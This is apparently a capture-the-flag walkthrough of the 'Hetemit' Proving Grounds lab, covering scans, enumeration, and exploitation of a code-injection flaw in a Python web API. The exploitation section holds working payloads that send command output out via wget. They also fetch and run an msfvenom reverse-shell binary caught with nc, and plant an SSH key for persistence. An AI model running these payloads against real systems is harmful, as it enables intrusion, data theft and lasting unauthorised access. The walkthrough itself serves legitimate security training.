# Hetemit

# Enumeration

## nmap

```bash
┌──(kali㉿kali)-[~]
└─$ rustscan -a 192.168.71.117 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.71.117:21
Open 192.168.71.117:22
Open 192.168.71.117:80
Open 192.168.71.117:139
Open 192.168.71.117:445
Open 192.168.71.117:18000
Open 192.168.71.117:50000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 12:35 EST
Initiating Ping Scan at 12:35
Scanning 192.168.71.117 [2 ports]
Completed Ping Scan at 12:35, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:35
Completed Parallel DNS resolution of 1 host. at 12:35, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:35
Scanning 192.168.71.117 [7 ports]
Discovered open port 139/tcp on 192.168.71.117
Discovered open port 22/tcp on 192.168.71.117
Discovered open port 80/tcp on 192.168.71.117
Discovered open port 445/tcp on 192.168.71.117
Discovered open port 21/tcp on 192.168.71.117
Discovered open port 18000/tcp on 192.168.71.117
Discovered open port 50000/tcp on 192.168.71.117
Completed Connect Scan at 12:35, 0.17s elapsed (7 total ports)
Nmap scan report for 192.168.71.117
Host is up, received syn-ack (0.17s latency).
Scanned at 2022-02-27 12:35:21 EST for 0s

PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack
22/tcp    open  ssh          syn-ack
80/tcp    open  http         syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
18000/tcp open  biimenu      syn-ack
50000/tcp open  ibm-db2      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.78 seconds

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

```
# Nmap 7.91 scan initiated Sun Feb 27 12:32:06 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hetemit/results/192.168.71.117/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hetemit/results/192.168.71.117/scans/xml/_full_tcp_nmap.xml" 192.168.71.117
adjust_timeouts2: packet supposedly had rtt of -356594 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -356594 microseconds.  Ignoring time.
Nmap scan report for 192.168.71.117
Host is up, received user-set (0.17s latency).
Scanned at 2022-02-27 12:32:08 EST for 308s
Not shown: 65528 filtered ports
Reason: 65528 no-responses
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.71
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH2Cap49zuKy70lHzXsOn9iOap0h1Dnwk14D6PNKugueOqGpYoffwCGCA0wF4cI3+MRjuHz4xGznmtTIP3vOBZINZvT5PsNcvu6ef0SDfDOMFbzsEirhpQuoBYvgmEuJ4u1VMiwNaYQ0jw9t+nsR2MAIym/wdKt+ghYm4qlB3WvLMV41uCu0F7OQadRX8GWrLWLucjSQ1f80tkV7mc7ZfuTm8YdsAOkNQufHkVE+Alk0NpHdqLh/6FHxmEqYwP0jX6HS/lg+MfczIbIQ91v7+ljvo3qgdSZPqqulUtQuj/Rb/gmIfItzFZIxTzLQ6FuKKmoTMXaR/tXf93+91z+kBdDaZe/5eu6fLCdGuFyioB97LdZGJq8uFbM0BpNeBYc0i/DOFwxWBhO8/zzv1uaTUKuS1B+bny1iUTiQoJj6GVRQmvgk/2Km5SanF3Cp4PSSJMQ112Umjg1T61ah/i//KXAyZ25xOznolBw/aoCc9cremrkycUp7dmuATBNCgHFS0=
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPTMpDGmoKZ96W+Ivvw7sQmnD1U41OY34oAzJ5Z1/AP/iVj+TpKO6lCKPxDq+9nbJJU4dtQx8X+KjQqUtpYIUhw=
|   256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEUnTSrfkvL2AJJsozjPtXIWf/6Z7UB9WptTiOOX93m4
80/tcp    open  http        syn-ack ttl 63 Apache httpd 2.4.37 ((centos))
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
139/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
18000/tcp open  biimenu?    syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        syn-ack ttl 63 Werkzeug httpd 1.0.1 (Python 3.6.8)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port18000-TCP:V=7.91%I=9%D=2/27%Time=621BB65F%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReque
SF:st,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x2
SF:0charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>\n<h
SF:tml\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n
SF:\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x
SF:20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20backg
SF:round-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20
SF:\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-f
SF:amily:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x20
SF:\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-h
SF:eight:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x2
SF:0\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-spa
SF:ce:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\
SF:x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x
SF:20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\
SF:x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\
SF:x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x2
SF:0\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20paddi
SF:ng:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{\
SF:n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\x20\
SF:x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202em;\
SF:n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20\x20
SF:color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n\x20
SF:\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x20\x
SF:20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20chars
SF:et=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x
SF:20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20c
SF:olor:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x
SF:20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x
SF:20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-
SF:serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x
SF:20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\
SF:x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20
SF:\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#
SF:EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x
SF:20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x
SF:20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\
SF:x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\
SF:x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20
SF:\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\
SF:x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x2
SF:0font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20
SF:\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-he
SF:ight:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x
SF:20\x20\x20\x20\x20\x20bord");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4.4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.12 (90%), Linux 4.4 (90%), Linux 4.9 (90%), Linux 3.10 (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=2/27%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=621BB6CC%P=x86_64-pc-linux-gnu)
SEQ(SP=FF%GCD=1%ISR=10B%TI=Z%TS=A)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 36.474 days (since Sat Jan 22 01:14:36 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

Host script results:
|_clock-skew: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45909/tcp): CLEAN (Timeout)
|   Check 2 (port 50171/tcp): CLEAN (Timeout)
|   Check 3 (port 30371/udp): CLEAN (Timeout)
|   Check 4 (port 29061/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-27T17:36:38
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   171.94 ms 192.168.49.1
2   171.91 ms 192.168.71.117

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 27 12:37:16 2022 -- 1 IP address (1 host up) scanned in 311.67 seconds
```

## 21 - FTP

```bash
┌──(kali㉿kali)-[/tmp]
└─$ pftp 192.168.128.117                                                                                                                                          130 ⨯
Connected to 192.168.128.117.
220 (vsFTPd 3.0.3)
Name (192.168.128.117:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (192,168,128,117,208,88).
ftp: connect: Connection timed out
ftp>
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.128.117
Connected to 192.168.128.117.
220 (vsFTPd 3.0.3)
Name (192.168.128.117:kali): admin
530 This FTP server is anonymous only.
Login failed.
ftp> exit
221 Goodbye.
```

```bash                                                    
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.128.117
Connected to 192.168.128.117.
220 (vsFTPd 3.0.3)
Name (192.168.128.117:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put t
local: t remote: t
200 PORT command successful. Consider using PASV.
553 Could not create file.
ftp> 
```

## 22 - SSH
## 80 - Web

![](Pasted%20image%2020220228013356.png)

## 139,445 - Samba

```bash
┌──(kali㉿kali)-[~]
└─$ smbmap -H 192.168.71.117                                                                                                                                        1 ⨯
[+] IP: 192.168.71.117:445      Name: 192.168.71.117                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Cmeeks                                                  NO ACCESS       cmeeks Files
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.11.2)
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## 18000 - Web

![](Pasted%20image%2020220302190755.png)

![](Pasted%20image%2020220302190903.png)

![](Pasted%20image%2020220302190921.png)

![](Pasted%20image%2020220302192006.png)

![](Pasted%20image%2020220302195747.png)
![](Pasted%20image%2020220302195757.png)

## 50000 - Web API

```bash
┌──(kali㉿kali)-[/tmp]
└─$ curl 192.168.128.117:50000
{'/generate', '/verify'}                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl 192.168.128.117:50000/generate
{'email@domain'}                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl 192.168.128.117:50000/verify  
{'code'}                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl 192.168.128.117:50000/verify/code
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl 192.168.128.117:50000/verify     
{'code'}                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

# Exploitation

![](Pasted%20image%2020220320163746.png)

```
┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       
└─$ wfuzz --hc 500 -w cmd-wordlist.txt -d "code=FUZZ" http://192.168.69.117:50000/verify
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************                                                                                                                        Target: http://192.168.69.117:50000/verify
Total requests: 102

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================                   
000000059:   200        0 L      3 W        22 Ch       "%0Aid"
000000061:   200        0 L      3 W        22 Ch       "%0Aid%0A"

Total time: 3.806988
Processed Requests: 102
Filtered Requests: 100
Requests/sec.: 26.79283 
```

## RCE Output

```
┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:18000/ --post-data $(whoami)")'                                                              
0
┌── 
```

```
┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       
└─$ nc -nlvp 18000                                                                      
Listening on 0.0.0.0 18000                                                              
Connection received on 192.168.69.117 37634                                             
POST / HTTP/1.1                                                                         
User-Agent: Wget/1.19.5 (linux-gnu)                                                     
Accept: */*                                                                             
Accept-Encoding: identity                                                               
Host: 192.168.49.69:18000                                                               
Connection: Keep-Alive                                                                  
Content-Type: application/x-www-form-urlencoded                                         
Content-Length: 6                                                                                                                                                               cmeeks                                                                                  
^C
```

```
┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(uname -a 2>%261)\"")'                                                 1024┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(/tmp/shell.rev 2>%261)\"")'                                           1024┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(/tmp/shell.rev 2>%261)\"")'
```


```
┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          └─$ nc -nlvp 50000                                                                      Listening on 0.0.0.0 50000                                                              Connection received on 192.168.69.117 44838                                             POST / HTTP/1.1                                                                         User-Agent: Wget/1.19.5 (linux-gnu)                                                     Accept: */*                                                                             Accept-Encoding: identity                                                               Host: 192.168.49.69:50000                                                               Connection: Keep-Alive                                                                  Content-Type: application/x-www-form-urlencoded                                         Content-Length: 109                                                                                                                                                             Linux hetemit 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux^C                                                                                                                                                         ┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          └─$ nc -nlvp 50000                                                                      Listening on 0.0.0.0 50000                                                              Connection received on 192.168.69.117 44850                                             POST / HTTP/1.1                                                                         User-Agent: Wget/1.19.5 (linux-gnu)                                                     Accept: */*                                                                             Accept-Encoding: identity                                                               Host: 192.168.49.69:50000                                                               Connection: Keep-Alive                                                                  Content-Type: application/x-www-form-urlencoded                                         Content-Length: 37                                                                                                                                                              sh: /tmp/shell.rev: Permission denied
```

# Reverse shell

```
┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools] └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(wget 192.168.49.69:18000/shell.rev -O /tmp/rev  2>%261)\"")'          1024┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(chmod 777 /tmp/rev 2>%261)\"")'                                       1024┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(/tmp/rev 2>%261)\"")'
```


```
┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          └─$ nc -nlvp 50000                                                                      Listening on 0.0.0.0 50000                                                              Connection received on 192.168.69.117 44898                                             POST / HTTP/1.1                                                                         User-Agent: Wget/1.19.5 (linux-gnu)                                                     Accept: */*                                                                             Accept-Encoding: identity                                                               Host: 192.168.49.69:50000                                                               Connection: Keep-Alive                                                                  Content-Type: application/x-www-form-urlencoded                                         Content-Length: 364                                                                                                                                                             --2022-03-13 14:50:48--  http://192.168.49.69:18000/shell.rev                           Connecting to 192.168.49.69:18000... connected.                                         HTTP request sent, awaiting response... 200 OK                                          Length: 194 [application/octet-stream]                                                  Saving to: ‘/tmp/rev’                                                                                                                                                                0K                                                       100% 49.5M=0s                                                                                                     2022-03-13 14:50:48 (49.5 MB/s) - ‘/tmp/rev’ saved [194/194]^C                                                                                                                  ┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          └─$ nc -nlvp 50000                                                                      Listening on 0.0.0.0 50000 
```

```
┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.69 LPORT=18000 -f elf -o shell.rev                                                                                 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload    [-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload                                            Payload size: 74 bytes                                                                  Final size of elf file: 194 bytes
Saved as: shell.rev                                                                                                                                                             ┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       └─$ python3 -m http.server 18000                                                        Serving HTTP on 0.0.0.0 port 18000 (http://0.0.0.0:18000/) ...                          192.168.69.117 - - [13/Mar/2022 22:48:31] "GET /shell.rev HTTP/1.1" 200 -
^[[A^C                                                                                  Keyboard interrupt received, exiting.                                                                                                                                           ┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       └─$ nc -nlvp 18000                                                                      Listening on 0.0.0.0 18000
^C                                                                                      
┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       └─$ python3 -m http.server 18000                                                        Serving HTTP on 0.0.0.0 port 18000 (http://0.0.0.0:18000/) ...                          192.168.69.117 - - [13/Mar/2022 22:50:47] "GET /shell.rev HTTP/1.1" 200 -               ^C                                                                                      Keyboard interrupt received, exiting.                                                                                                                                           ┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       └─$ nc -nlvp 18000                                                                      Listening on 0.0.0.0 18000                                                              Connection received on 192.168.69.117 37712                                             ^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B                                                                        /bin/sh: line 1: $'\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[B\E[B\E[B\E[B\E[B\E[B\E[B\E[B\E[B\E[B': command not found                                 whoami                                                                                  cmeeks 
pwd                                                                                     /home/cmeeks/restjson_hetemit
cd ..                                                                                   ls                                                                                      local.txt
register_hetemit                                                                        restjson_hetemit                                                                        share
cat local.txt
a27c8cbc15d2bd6988632808985f11e4                                                        ifconfig                                                                                /bin/sh: line 7: ifconfig: command not found                                            /sbin/ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                                    inet 192.168.69.117  netmask 255.255.255.0  broadcast 192.168.69.255                    inet6 fe80::c23d:c707:9770:ddae  prefixlen 64  scopeid 0x20<link>                       ether 00:50:56:ba:67:65  txqueuelen 1000  (Ethernet)                                    RX packets 5575  bytes 595360 (581.4 KiB)                                               RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5515  bytes 779241 (760.9 KiB)                                               TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                                                                                                              lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                                    inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)                                                 RX packets 2923  bytes 969215 (946.4 KiB)                                               RX errors 0  dropped 0  overruns 0  frame 0                                             TX packets 2923  bytes 969215 (946.4 KiB)                                               TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
## ssh

```
mkdir .ssh                                                                              cd .ssh                                                                                 echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxTqZC9zdTSFte3KadddXjUQKjFD/qTMq1KLLthEcf8EeZB0cx4GnC+msACTX7tYfvtBR8702YE16Xz8jD6GIb/JAc3LPm1UHTbAeRzlpmo2fWqAGuUmX6BJ+1eEGDVKdeD0aK/zjTjaMRSCowFfaaOgtwyMdELQibz3y7UtD9vVZ1D5qlpRUOfsKHTfpS3IIHek0XK91K/M8C2XoeKEsVscWjAmHACg/inAJwjpxK7I02LJUgJ2X4qx4tqmFVjeJnXcxUn4hB56bv8IQ++rtnOSw86sJrf206WXuonmQ8LWdQilmaNm2c7jAdGMPo+zXMjgmGLiSLnCw8ZSlYkcg5ma0Uq0SA+Cr0iypqU/AkRJqVCTgA72VVI/WPylJ7vjFJgLyt3v3W5PkRqih963vnqt8B/irKZl539BW7ySJyviynRCwaDaaCCSJeZzP5pol7HUO0+3J4HBeY/YgpSEuzTpUwuhV5H6gxgmMSRZlp+FcOvKXBTOgFqJQeDq+sYQs= kali@DESKTOP-61F9HO2' > authorized_keys
```

```
┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          
└─$ cat ~/.ssh/id_rsa.pub                                                               
